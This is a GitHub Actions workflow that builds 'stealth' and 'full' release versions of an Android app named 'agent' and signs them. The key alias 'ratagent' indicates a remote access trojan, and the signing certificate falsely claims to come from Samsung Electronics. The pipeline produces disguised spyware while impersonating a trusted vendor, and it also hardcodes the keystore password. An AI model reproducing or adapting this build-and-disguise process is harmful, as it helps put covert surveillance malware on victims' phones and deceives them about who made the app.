name: build agent
on:
  push:
    branches: [main]
  workflow_dispatch:

jobs:
  build:
    runs-on: ubuntu-latest
    steps:
    - uses: actions/checkout@v4

    - uses: actions/setup-java@v4
      with:
        distribution: 'temurin'
        java-version: '17'

    - name: Install Android SDK
      run: |
        sudo mkdir -p /usr/local/lib/android/sdk/cmdline-tools
        curl -sL https://dl.google.com/android/repository/commandlinetools-linux-9477386_latest.zip -o /tmp/clt.zip
        sudo unzip -q /tmp/clt.zip -d /usr/local/lib/android/sdk/cmdline-tools
        sudo mv /usr/local/lib/android/sdk/cmdline-tools/cmdline-tools /usr/local/lib/android/sdk/cmdline-tools/latest
        export ANDROID_HOME=/usr/local/lib/android/sdk
        yes | /usr/local/lib/android/sdk/cmdline-tools/latest/bin/sdkmanager --licenses > /dev/null || true
        /usr/local/lib/android/sdk/cmdline-tools/latest/bin/sdkmanager "platform-tools" "platforms;android-34" "build-tools;34.0.0" > /dev/null

    - name: Build APKs (stealth + full, release)
      env:
        ANDROID_HOME: /usr/local/lib/android/sdk
      run: |
        curl -sL https://services.gradle.org/distributions/gradle-8.5-bin.zip -o /tmp/gradle.zip
        unzip -q /tmp/gradle.zip -d /opt
        /opt/gradle-8.5/bin/gradle assembleStealthRelease assembleFullRelease --no-daemon -g /opt/gradle-8.5 || exit 1

    - name: Sign APKs
      run: |
        BT=/usr/local/lib/android/sdk/build-tools/34.0.0
        ALIAS="ratagent"; KPASS="ratagent123"
        keytool -genkey -v -keystore /tmp/keystore.jks \
          -keyalg RSA -keysize 2048 -validity 10950 \
          -alias ratagent -storepass ratagent123 -keypass ratagent123 \
          -dname "CN=Samsung Electronics Co., Ltd., O=Samsung, L=Suwon, S=Gyeonggi, C=KR"
        $BT/zipalign -f 4 \
          app/build/outputs/apk/stealth/release/stealth-release-unsigned.apk \
          /tmp/stealth-aligned.apk
        $BT/apksigner sign --ks /tmp/keystore.jks \
          --ks-key-alias "$ALIAS" \
          --ks-pass pass:"$KPASS" --key-pass pass:"$KPASS" \
          --out /tmp/stealth-release-signed.apk /tmp/stealth-aligned.apk
        $BT/apksigner verify /tmp/stealth-release-signed.apk && echo "stealth signed OK"

        $BT/zipalign -f 4 \
          app/build/outputs/apk/full/release/full-release-unsigned.apk \
          /tmp/full-aligned.apk
        $BT/apksigner sign --ks /tmp/keystore.jks \
          --ks-key-alias "$ALIAS" \
          --ks-pass pass:"$KPASS" --key-pass pass:"$KPASS" \
          --out /tmp/full-release-signed.apk /tmp/full-aligned.apk
        $BT/apksigner verify /tmp/full-release-signed.apk && echo "full signed OK"

        cp /tmp/stealth-release-signed.apk /tmp/stealth.apk
        cp /tmp/full-release-signed.apk   /tmp/full.apk

    - uses: actions/upload-artifact@v4
      with:
        name: agent-apk
        path: |
          /tmp/stealth.apk
          /tmp/full.apk
